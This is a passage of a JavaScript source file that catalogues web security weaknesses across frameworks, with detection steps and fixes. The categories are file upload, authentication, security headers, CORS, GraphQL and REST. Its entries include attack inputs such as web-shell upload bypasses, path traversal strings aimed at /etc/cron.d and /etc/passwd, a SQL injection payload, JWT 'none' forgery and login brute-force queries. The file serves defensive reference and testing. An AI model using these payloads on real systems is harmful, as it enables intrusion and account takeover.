        description: "Trusting X-Forwarded-For, X-Real-IP headers without configuring trusted proxies allows IP spoofing.",
        impact: "IP-based access control bypass, rate limiting bypass, log injection",
        detection: "Send requests with spoofed X-Forwarded-For header",
        remediation: "Configure trusted proxies: router.SetTrustedProxies([]string{\"10.0.0.0/8\"})"
      }
    ],
    knownCVEPatterns: [
      { cve: "CVE-2023-29401", title: "MIME type confusion", versions: "<1.9.1", description: "Improper MIME type determination for uploaded files" },
      { cve: "CVE-2023-26125", title: "Open redirect", versions: "<1.9.0", description: "Open redirect via backslash-prefixed URLs" },
      { cve: "CVE-2020-28483", title: "CRLF injection", versions: "<1.7.7", description: "CRLF injection via crafted header values" }
    ]
  }
};

// Comprehensive file upload security patterns across all frameworks
export const FILE_UPLOAD_SECURITY = {
  universalRisks: [
    {
      id: "UPLOAD-001",
      title: "Web Shell Upload",
      severity: "critical",
      description: "Uploading executable files (PHP, JSP, ASPX, PY, JS) that run as web shells on the server.",
      bypassTechniques: [
        { technique: "Double Extension", example: "shell.php.jpg — some servers execute based on first extension", effectiveness: "medium" },
        { technique: "Null Byte", example: "shell.php%00.jpg — truncates filename at null byte in older systems", effectiveness: "low (patched in most modern systems)" },
        { technique: "Case Variation", example: "shell.pHP, shell.Php — bypass case-sensitive extension blacklists", effectiveness: "medium" },
        { technique: "Alternative Extensions", example: ".phtml, .php5, .php7, .phps, .phar for PHP; .jspx, .jsw for Java; .ashx, .asmx for .NET", effectiveness: "high" },
        { technique: "Content-Type Manipulation", example: "Set Content-Type: image/jpeg while uploading PHP file", effectiveness: "high against type-only checks" },
        { technique: "Magic Bytes Prepend", example: "Prepend GIF89a; to PHP file to pass magic byte validation", effectiveness: "high" },
        { technique: ".htaccess Upload", example: "Upload .htaccess with 'AddType application/x-httpd-php .jpg' to make JPGs executable", effectiveness: "high on Apache" },
        { technique: "SVG with Script", example: "<svg onload='alert(1)'> — SVGs can contain JavaScript", effectiveness: "high for stored XSS" },
        { technique: "Polyglot Files", example: "Files that are valid as both image and script", effectiveness: "high against single-check validation" },
        { technique: "Race Condition", example: "Upload file, access it before server-side validation/removal completes", effectiveness: "varies" }
      ],
      defenses: [
        "Validate file extension against a whitelist (not blacklist)",
        "Check MIME type AND magic bytes, not just Content-Type header",
        "Store files outside web root or on separate storage (S3, GCS)",
        "Rename files on upload (UUID-based naming)",
        "Set proper Content-Disposition: attachment headers when serving",
        "Use separate domain for user-uploaded content (CDN/subdomain)",
        "Scan uploads with antivirus/malware scanner",
        "Set maximum file size limits",
        "Strip metadata from uploaded images (EXIF data can contain XSS payloads)"
      ]
    },
    {
      id: "UPLOAD-002",
      title: "Path Traversal via Filename",
      severity: "high",
      description: "Using user-supplied filename directly allows overwriting arbitrary files on the server.",
      bypassTechniques: [
        { technique: "Dot-Dot-Slash", example: "../../../etc/cron.d/backdoor", effectiveness: "high without sanitization" },
        { technique: "URL Encoding", example: "..%2f..%2f..%2fetc%2fpasswd", effectiveness: "medium" },
        { technique: "Double Encoding", example: "..%252f..%252f..%252f", effectiveness: "medium" },
        { technique: "Absolute Path", example: "/etc/cron.d/backdoor — some systems accept absolute paths", effectiveness: "low" }
      ],
      defenses: [
        "Generate server-side filenames — never use the original filename for storage",
        "Use path.basename() / os.path.basename() to strip directory components",
        "Validate the resolved path starts with the upload directory",
        "Use chroot or containerization to limit filesystem access"
      ]
    },
    {
      id: "UPLOAD-003",
      title: "Denial of Service via Large Files",
      severity: "medium",
      description: "Uploading extremely large files to exhaust disk space, memory, or processing time.",
      defenses: [
        "Set maximum upload size at web server level (nginx client_max_body_size)",
        "Set framework-level limits (MAX_UPLOAD_SIZE, MAX_CONTENT_LENGTH)",
        "Stream uploads to storage instead of buffering in memory",
        "Implement per-user upload quotas",
        "Use temporary storage with TTL for processing"
      ]
    }
  ],
  perFramework: {
    django: {
      maxSize: "FILE_UPLOAD_MAX_MEMORY_SIZE (default 2.5MB before writing to disk), DATA_UPLOAD_MAX_MEMORY_SIZE (default 2.5MB)",
      validation: "Use FileExtensionValidator, validate_image_file_extension. Custom clean_<fieldname>() on forms.",
      storage: "Default: MEDIA_ROOT on filesystem. Recommended: django-storages with S3/GCS.",
      example: "class UploadForm(forms.Form):\n    file = forms.FileField(validators=[FileExtensionValidator(allowed_extensions=['pdf', 'doc'])])"
    },
    rails: {
      maxSize: "Configured in Nginx/Apache. Rails does not enforce by default.",
      validation: "Active Storage validates content_type and byte_size. Use validate :avatar, content_type: ['image/png', 'image/jpg']",
      storage: "Active Storage with local disk, S3, GCS, or Azure. config/storage.yml",
      example: "validates :document, content_type: ['application/pdf'], size: { less_than: 10.megabytes }"
    },
    express: {
      maxSize: "multer: limits: { fileSize: 5 * 1024 * 1024 }. busboy: limits option.",
      validation: "multer fileFilter function for MIME type checking. Manual magic byte validation.",
      storage: "multer diskStorage or memoryStorage. multer-s3 for S3.",
      example: "const upload = multer({ limits: { fileSize: 5*1024*1024 }, fileFilter: (req, file, cb) => { if (!['image/jpeg','image/png'].includes(file.mimetype)) return cb(new Error('Invalid type')); cb(null, true); } })"
    },
    spring: {
      maxSize: "spring.servlet.multipart.max-file-size=10MB, spring.servlet.multipart.max-request-size=50MB",
      validation: "Custom validation in controller. Check content type and extension.",
      storage: "Default: temp directory. Recommended: Spring Cloud AWS S3 or custom storage service.",
      example: "@PostMapping(\"/upload\") ResponseEntity<?> handleUpload(@RequestParam MultipartFile file) { if (!ALLOWED_TYPES.contains(file.getContentType())) throw new BadRequestException(); }"
    },
    laravel: {
      maxSize: "upload_max_filesize and post_max_size in php.ini. Laravel validation: 'file' => 'max:10240' (KB).",
      validation: "Validation rules: 'file' => 'required|file|mimes:pdf,doc|max:10240'",
      storage: "Laravel Filesystem with local, S3, or custom drivers. config/filesystems.php",
      example: "$request->validate(['avatar' => 'required|image|mimes:jpeg,png|max:2048']); $path = $request->file('avatar')->store('avatars', 's3');"
    }
  }
};

// Cross-framework authentication vulnerability patterns
export const AUTH_VULNERABILITY_PATTERNS = [
  {
    id: "AUTH-VULN-001",
    title: "JWT Algorithm Confusion",
    description: "Accepting 'none' algorithm or switching from RS256 to HS256 using the public key as HMAC secret.",
    affectedFrameworks: ["Express", "FastAPI", "Spring", "Flask", "All"],
    severity: "critical",
    detection: "Modify JWT header alg field to 'none' or 'HS256' and re-sign",
    example: "Header: {\"alg\":\"none\",\"typ\":\"JWT\"} → Token accepted without signature verification",
    remediation: "Explicitly specify allowed algorithms: jwt.verify(token, secret, { algorithms: ['RS256'] })"
  },
  {
    id: "AUTH-VULN-002",
    title: "Session Fixation",
    description: "Application does not regenerate session ID after authentication, allowing attacker to set a known session ID before victim logs in.",
    affectedFrameworks: ["PHP frameworks", "Express", "Flask"],
    severity: "high",
    detection: "Set a session cookie, authenticate, and check if the session ID changes",
    remediation: "Regenerate session ID on login: req.session.regenerate() (Express), session.regenerate() (Flask), session_regenerate_id(true) (PHP)"
  },
  {
    id: "AUTH-VULN-003",
    title: "Timing Attack on Password Comparison",
    description: "Using == or strcmp() for password/token comparison leaks information through response time differences.",
    affectedFrameworks: ["All"],
    severity: "medium",
    detection: "Measure response times for passwords with different numbers of correct leading characters",
    remediation: "Use constant-time comparison: hmac.compare_digest() (Python), crypto.timingSafeEqual() (Node.js), MessageDigest.isEqual() (Java)"
  },
  {
    id: "AUTH-VULN-004",
    title: "OAuth2 State Parameter Missing",
    description: "OAuth2 flow without state parameter allows CSRF attacks on the callback endpoint.",
    affectedFrameworks: ["All"],
    severity: "high",
    detection: "Check OAuth2 authorization URL for state parameter. Replay callback with different state.",
    remediation: "Generate cryptographically random state, store in session, and verify on callback."
  },
  {
    id: "AUTH-VULN-005",
    title: "Insecure Password Reset",
    description: "Password reset tokens that are predictable, don't expire, aren't single-use, or are sent in URL parameters.",
    affectedFrameworks: ["All"],
    severity: "high",
    detection: "Request multiple reset tokens and check for patterns. Check token length and entropy. Verify expiration.",
    remediation: "Use cryptographically random tokens (min 128 bits). Set short expiration (1 hour). Single-use. Store hashed in database."
  },
  {
    id: "AUTH-VULN-006",
    title: "Username Enumeration",
    description: "Different error messages or response times for valid vs. invalid usernames during login or password reset.",
    affectedFrameworks: ["All"],
    severity: "low",
    detection: "Compare responses for existing vs. non-existing usernames on login and reset endpoints",
    remediation: "Use generic messages: 'Invalid credentials' for login, 'If the email exists, a reset link has been sent' for reset."
  },
  {
    id: "AUTH-VULN-007",
    title: "Broken Function-Level Authorization",
    description: "Admin endpoints accessible to regular users because authorization checks are only on the frontend.",
    affectedFrameworks: ["All"],
    severity: "critical",
    detection: "Access admin URLs/API endpoints with a regular user token. Try changing user role in JWT claims.",
    remediation: "Implement server-side authorization on every endpoint. Use middleware/decorators for role checks."
  },
  {
    id: "AUTH-VULN-008",
    title: "Multi-Factor Authentication Bypass",
    description: "MFA can be bypassed by directly accessing post-MFA endpoints, manipulating response, or brute-forcing codes.",
    affectedFrameworks: ["All"],
    severity: "critical",
    detection: "After entering password but before MFA, try accessing protected pages. Try brute-forcing 6-digit codes.",
    remediation: "Verify MFA completion server-side on every request. Rate-limit MFA attempts. Lock account after failures."
  }
];

// Security header comprehensive reference per framework
export const SECURITY_HEADERS_REFERENCE = {
  headers: [
    {
      name: "Content-Security-Policy",
      purpose: "Prevent XSS, clickjacking, and code injection attacks by specifying allowed content sources",
      recommended: "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self'; connect-src 'self'; frame-ancestors 'none'; base-uri 'self'; form-action 'self'",
      directives: [
        { directive: "default-src", description: "Fallback for other directives", example: "default-src 'self'" },
        { directive: "script-src", description: "Allowed script sources", example: "script-src 'self' 'nonce-abc123'" },
        { directive: "style-src", description: "Allowed stylesheet sources", example: "style-src 'self' 'unsafe-inline'" },
        { directive: "img-src", description: "Allowed image sources", example: "img-src 'self' data: https:" },
        { directive: "connect-src", description: "Allowed fetch/XHR/WebSocket targets", example: "connect-src 'self' https://api.example.com" },
        { directive: "frame-ancestors", description: "Who can embed this page (replaces X-Frame-Options)", example: "frame-ancestors 'none'" },
        { directive: "base-uri", description: "Allowed <base> tag URLs", example: "base-uri 'self'" },
        { directive: "form-action", description: "Allowed form submission targets", example: "form-action 'self'" },
        { directive: "report-uri / report-to", description: "Where to send CSP violation reports", example: "report-to csp-endpoint" }
      ],
      frameworkSetup: {
        django: "pip install django-csp; CSP_DEFAULT_SRC = (\"'self'\",); CSP_SCRIPT_SRC = (\"'self'\",)",
        rails: "config.content_security_policy { |policy| policy.default_src :self; policy.script_src :self }",
        express: "app.use(helmet.contentSecurityPolicy({ directives: { defaultSrc: [\"'self'\"], scriptSrc: [\"'self'\"] } }))",
        spring: "http.headers().contentSecurityPolicy(\"default-src 'self'\")",
        laravel: "Custom middleware or spatie/laravel-csp package",
        nextjs: "headers() in next.config.js: { key: 'Content-Security-Policy', value: \"default-src 'self'\" }"
      }
    },
    {
      name: "Strict-Transport-Security",
      purpose: "Force HTTPS for all future requests to the domain",
      recommended: "max-age=31536000; includeSubDomains; preload",
      parameters: [
        { param: "max-age", description: "Seconds to remember HTTPS-only policy", recommended: "31536000 (1 year)" },
        { param: "includeSubDomains", description: "Apply to all subdomains", recommended: "Include if all subdomains support HTTPS" },
        { param: "preload", description: "Allow inclusion in browser preload lists", recommended: "Add after verifying all subdomains work with HTTPS" }
      ],
      frameworkSetup: {
        django: "SECURE_HSTS_SECONDS = 31536000; SECURE_HSTS_INCLUDE_SUBDOMAINS = True; SECURE_HSTS_PRELOAD = True",
        rails: "config.force_ssl = true (sets HSTS automatically)",
        express: "app.use(helmet.hsts({ maxAge: 31536000, includeSubDomains: true, preload: true }))",
        spring: "http.headers().httpStrictTransportSecurity().maxAgeInSeconds(31536000).includeSubDomains(true)",
        laravel: "Custom middleware or set in web server config",
        nextjs: "headers() in next.config.js"
      }
    },
    {
      name: "X-Content-Type-Options",
      purpose: "Prevent browsers from MIME-sniffing the response content type",
      recommended: "nosniff",
      frameworkSetup: {
        django: "SECURE_CONTENT_TYPE_NOSNIFF = True (default since Django 3.0)",
        rails: "Set automatically by default",
        express: "app.use(helmet.noSniff()) — included in helmet() by default",
        spring: "http.headers().contentTypeOptions() — enabled by default with Spring Security",
        laravel: "Custom middleware",
        nextjs: "headers() in next.config.js"
      }
    },
    {
      name: "X-Frame-Options",
      purpose: "Prevent clickjacking by controlling if the page can be embedded in frames",
      recommended: "DENY (or SAMEORIGIN if you need to frame your own content)",
      values: [
        { value: "DENY", description: "Page cannot be displayed in any frame" },
        { value: "SAMEORIGIN", description: "Page can only be displayed in a frame on the same origin" }
      ],
      note: "Being replaced by Content-Security-Policy frame-ancestors directive, but still useful for older browser support",
      frameworkSetup: {
        django: "X_FRAME_OPTIONS = 'DENY' (default)",
        rails: "config.action_dispatch.default_headers['X-Frame-Options'] = 'DENY'",
        express: "app.use(helmet.frameguard({ action: 'deny' }))",
        spring: "http.headers().frameOptions().deny()",
        laravel: "Custom middleware",
        nextjs: "headers() in next.config.js"
      }
    },
    {
      name: "Referrer-Policy",
      purpose: "Control how much referrer information is sent with requests",
      recommended: "strict-origin-when-cross-origin",
      values: [
        { value: "no-referrer", description: "Never send referrer" },
        { value: "same-origin", description: "Only send referrer to same-origin requests" },
        { value: "strict-origin", description: "Send only origin (no path) for cross-origin, nothing for downgrade" },
        { value: "strict-origin-when-cross-origin", description: "Full URL for same-origin, origin-only for cross-origin, nothing for downgrade" }
      ],
      frameworkSetup: {
        django: "SECURE_REFERRER_POLICY = 'same-origin' (default since 3.1)",
        rails: "config.action_dispatch.default_headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'",
        express: "app.use(helmet.referrerPolicy({ policy: 'strict-origin-when-cross-origin' }))",
        spring: "http.headers().referrerPolicy(ReferrerPolicyHeaderWriter.ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN)",
        laravel: "Custom middleware",
        nextjs: "headers() in next.config.js"
      }
    },
    {
      name: "Permissions-Policy",
      purpose: "Control which browser features and APIs can be used (replaces Feature-Policy)",
      recommended: "camera=(), microphone=(), geolocation=(), payment=(), usb=()",
      features: [
        { feature: "camera", description: "Access to camera" },
        { feature: "microphone", description: "Access to microphone" },
        { feature: "geolocation", description: "Access to location data" },
        { feature: "payment", description: "Payment Request API" },
        { feature: "usb", description: "WebUSB API" },
        { feature: "fullscreen", description: "Fullscreen API" },
        { feature: "autoplay", description: "Media autoplay" },
        { feature: "display-capture", description: "Screen capture" }
      ],
      frameworkSetup: {
        django: "django-permissions-policy package or custom middleware",
        rails: "config.action_dispatch.default_headers['Permissions-Policy'] = 'camera=(), microphone=()'",
        express: "app.use(helmet.permittedCrossDomainPolicies())",
        spring: "http.headers().permissionsPolicy(policy -> policy.policy(\"camera=(), microphone=()\"))",
        laravel: "Custom middleware",
        nextjs: "headers() in next.config.js"
      }
    },
    {
      name: "Cross-Origin-Opener-Policy",
      purpose: "Prevent other origins from referencing this window, mitigating Spectre-class attacks",
      recommended: "same-origin",
      values: [
        { value: "same-origin", description: "Only same-origin pages can reference this window" },
        { value: "same-origin-allow-popups", description: "Same-origin with popups exception" },
        { value: "unsafe-none", description: "No restrictions (default, least secure)" }
      ]
    },
    {
      name: "Cross-Origin-Embedder-Policy",
      purpose: "Prevent loading cross-origin resources that don't grant permission, required for SharedArrayBuffer",
      recommended: "require-corp",
      values: [
        { value: "require-corp", description: "Only load resources that grant permission via CORP or CORS" },
        { value: "credentialless", description: "Load without credentials (less restrictive)" },
        { value: "unsafe-none", description: "No restrictions (default)" }
      ]
    },
    {
      name: "Cross-Origin-Resource-Policy",
      purpose: "Prevent other origins from loading this resource, defense against Spectre",
      recommended: "same-origin",
      values: [
        { value: "same-origin", description: "Only same-origin can load" },
        { value: "same-site", description: "Same site (including subdomains) can load" },
        { value: "cross-origin", description: "Any origin can load" }
      ]
    }
  ]
};

// CORS misconfiguration patterns
export const CORS_MISCONFIGURATIONS = [
  {
    id: "CORS-001",
    title: "Wildcard Origin with Credentials",
    severity: "critical",
    description: "Access-Control-Allow-Origin: * combined with Access-Control-Allow-Credentials: true. Browsers actually block this combination, but the real vulnerability is when the server reflects the Origin header in ACAO while allowing credentials.",
    detection: "curl -H 'Origin: https://evil.com' -I https://target.com/api/data — check if evil.com is reflected in ACAO",
    impact: "Cross-origin data theft via authenticated requests from any origin",
    remediation: "Whitelist specific origins. Never reflect arbitrary Origin headers with credentials."
  },
  {
    id: "CORS-002",
    title: "Origin Reflection",
    severity: "high",
    description: "Server reflects any Origin header value in Access-Control-Allow-Origin, effectively allowing any site to make cross-origin requests.",
    detection: "Send requests with various Origin headers and check if they're reflected in ACAO response header",
    impact: "Same as wildcard — any site can read response data",
    remediation: "Validate Origin against a strict whitelist before reflecting."
  },
  {
    id: "CORS-003",
    title: "Null Origin Allowed",
    severity: "high",
    description: "Access-Control-Allow-Origin: null is allowed. The null origin is sent by sandboxed iframes, local files, and redirect chains — an attacker can trigger it.",
    detection: "curl -H 'Origin: null' -I https://target.com/api/data",
    impact: "Cross-origin data theft via sandboxed iframe on attacker's page",
    remediation: "Never whitelist the 'null' origin."
  },
  {
    id: "CORS-004",
    title: "Subdomain Wildcard Trust",
    severity: "medium",
    description: "Trusting all subdomains (*.example.com) when any subdomain could be compromised or is user-controlled.",
    detection: "Check if foo.example.com origin is accepted. Look for subdomain takeover possibilities.",
    impact: "If any subdomain is compromised or user-controlled, cross-origin data theft is possible",
    remediation: "Whitelist specific subdomains. Audit all subdomains for takeover risks."
  },
  {
    id: "CORS-005",
    title: "Pre-flight Cache Poisoning",
    severity: "medium",
    description: "Excessively long Access-Control-Max-Age allows cached preflight responses to persist, potentially with stale CORS policies.",
    detection: "Check Access-Control-Max-Age value in preflight responses",
    impact: "Stale CORS policies may allow access that should have been revoked",
    remediation: "Set reasonable max-age (e.g., 3600 seconds / 1 hour). Don't exceed 86400 (24 hours)."
  }
];

// GraphQL security patterns
export const GRAPHQL_SECURITY = {
  vulnerabilities: [
    {
      id: "GQL-001",
      title: "Introspection Query Information Disclosure",
      severity: "medium",
      description: "GraphQL introspection queries (__schema, __type) expose the entire API schema including types, fields, mutations, and their documentation.",
      detection: "Send: { __schema { types { name fields { name type { name } } } } }",
      remediation: "Disable introspection in production. In Apollo: new ApolloServer({ introspection: false })"
    },
    {
      id: "GQL-002",
      title: "Denial of Service via Nested Queries",
      severity: "high",
      description: "Deeply nested queries exploit GraphQL's relational nature to cause exponential database queries (N+1 problem).",
      detection: "Send deeply nested query: { users { posts { comments { author { posts { comments { ... } } } } } } }",
      remediation: "Implement query depth limiting, query complexity analysis, and timeout. Use graphql-depth-limit and graphql-query-complexity."
    },
    {
      id: "GQL-003",
      title: "Batch Query Attack",
      severity: "medium",
      description: "Sending multiple queries in a single request to brute force, enumerate, or bypass rate limiting.",
      detection: "Send array of queries: [{ query: '...' }, { query: '...' }, ...]",
      remediation: "Limit batch size. Apply rate limiting per query, not per request. Disable batching if not needed."
    },
    {
      id: "GQL-004",
      title: "SQL/NoSQL Injection via Resolvers",
      severity: "critical",
      description: "Resolver functions that pass user arguments directly to database queries without parameterization.",
      detection: "Test query arguments with SQL/NoSQL payloads: { user(name: \"' OR 1=1--\") { id } }",
      remediation: "Use parameterized queries in all resolvers. Use ORM/ODM methods instead of raw queries."
    },
    {
      id: "GQL-005",
      title: "Authorization Bypass in Resolvers",
      severity: "critical",
      description: "Missing authorization checks in individual field resolvers allows accessing fields the user shouldn't see.",
      detection: "Query sensitive fields (email, role, internal IDs) with a low-privilege token",
      remediation: "Implement field-level authorization in resolvers. Use schema directives like @auth."
    },
    {
      id: "GQL-006",
      title: "Alias-Based Rate Limit Bypass",
      severity: "medium",
      description: "Using GraphQL aliases to send the same query multiple times in one request, bypassing per-request rate limiting.",
      detection: "{ a: login(user:\"admin\",pass:\"pass1\"), b: login(user:\"admin\",pass:\"pass2\"), c: login(user:\"admin\",pass:\"pass3\") }",
      remediation: "Implement rate limiting at the resolver level, not the HTTP request level."
    }
  ],
  bestPractices: [
    "Disable introspection in production",
    "Implement query depth limiting (recommended: max depth 7-10)",
    "Set query complexity limits based on field weights",
    "Use persistent/approved queries (query whitelisting) in production",
    "Implement field-level authorization, not just type-level",
    "Rate limit at the resolver level",
    "Use DataLoader to prevent N+1 queries",
    "Log and monitor unusual query patterns",
    "Disable GraphQL Playground/GraphiQL in production",
    "Validate and sanitize all input arguments"
  ]
};

// API security testing patterns (REST-specific, complementing GraphQL above)
export const REST_API_SECURITY = {
  authenticationAttacks: [
    {
      id: "REST-AUTH-001",
      title: "Bearer Token in URL",
      severity: "medium",
      description: "API accepts bearer tokens in URL query parameters, which get logged in server access logs, proxy logs, and browser history.",
      detection: "Try: GET /api/data?access_token=<token> instead of Authorization header",
      remediation: "Only accept tokens in the Authorization header. Reject tokens in URL parameters."
    },
    {
      id: "REST-AUTH-002",
      title: "Missing Token Expiration",
      severity: "high",
      description: "JWT or API tokens that never expire or have very long expiration times.",
      detection: "Decode JWT and check exp claim. Test old tokens for validity.",
      remediation: "Set short expiration (15-60 minutes for access tokens). Implement refresh token rotation."
    },
    {
      id: "REST-AUTH-003",
      title: "API Key in Request Body or Headers Without HTTPS",
      severity: "critical",
      description: "API keys transmitted over HTTP are visible to network observers.",
      detection: "Check if API works over HTTP (non-HTTPS)",
      remediation: "Enforce HTTPS for all API endpoints. Reject HTTP requests."
    }
  ],
  injectionAttacks: [
    {
      id: "REST-INJ-001",
      title: "HTTP Parameter Pollution",
      severity: "medium",
      description: "Sending duplicate parameters to bypass WAF, validation, or authorization: ?user=admin&user=attacker",
      detection: "Send duplicate parameters and check which value the backend uses",
      remediation: "Use framework's built-in parameter parsing. Validate parameter count."
    },
    {
      id: "REST-INJ-002",
      title: "HTTP Verb Tampering",
      severity: "medium",
      description: "Bypassing access controls by using unexpected HTTP methods. A POST-only endpoint might accept PUT/PATCH/DELETE without auth checks.",
      detection: "Try different HTTP methods: OPTIONS, PUT, PATCH, DELETE, TRACE on restricted endpoints",
      remediation: "Explicitly handle only expected HTTP methods. Return 405 for others."
    },
    {
      id: "REST-INJ-003",
      title: "Content-Type Confusion",
      severity: "medium",
      description: "Sending unexpected Content-Type headers to bypass input validation. JSON validation might not apply when sending XML or form data.",
      detection: "Send same data with different Content-Types: application/json, application/xml, application/x-www-form-urlencoded",
      remediation: "Validate Content-Type header. Only accept expected content types. Return 415 for unsupported types."
    }
  ],
  businessLogicFlaws: [
    {
      id: "REST-BIZ-001",
      title: "IDOR (Insecure Direct Object Reference)",
      severity: "high",
      description: "Sequential or predictable resource IDs allow accessing other users' data by modifying the ID parameter.",
      detection: "GET /api/users/123/profile — change 123 to 124 with same auth token",
      remediation: "Use UUIDs instead of sequential IDs. Implement object-level authorization checks."
    },
    {
      id: "REST-BIZ-002",
      title: "Mass Assignment via API",
      severity: "high",
      description: "API endpoints accepting all fields from request body, allowing users to set admin-only fields.",
      detection: "POST /api/users with extra fields: {\"name\":\"test\", \"role\":\"admin\", \"isVerified\":true}",
      remediation: "Use DTOs/serializers to whitelist allowed fields. Never bind directly to database models."
    },
    {
      id: "REST-BIZ-003",
      title: "Race Condition in Financial Operations",
      severity: "critical",
      description: "Concurrent API requests can exploit race conditions in balance checks, inventory management, or coupon redemption.",
      detection: "Send multiple simultaneous requests for the same transaction using parallel connections",
      remediation: "Use database transactions with proper isolation levels. Implement optimistic locking or idempotency keys."
    }
  ]
};
